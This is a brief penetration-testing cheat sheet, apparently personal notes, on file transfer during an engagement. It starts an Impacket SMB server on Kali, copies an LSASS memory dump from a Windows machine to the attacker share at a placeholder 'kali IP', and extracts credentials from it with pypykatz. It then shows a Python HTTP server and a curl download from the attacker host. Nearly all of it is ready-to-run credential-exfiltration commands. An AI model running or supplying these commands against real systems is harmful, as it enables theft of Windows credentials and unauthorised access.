# Impacket-SMBserver
```bash
(Kali)
mkdir transfer
sudo impacket-smbserver share ~/transfer -smb2support

(Windows)
Copy-Item "$env:USERPROFILE\Downloads\lsass.dmp" "\\kali IP\share\lsass-full.dmp"

pypykatz lsa minidump ~/transfer/lsass-full.dmp
```

# Python
```python
python3 -m http.server

curl -O http://KALI IP/share
```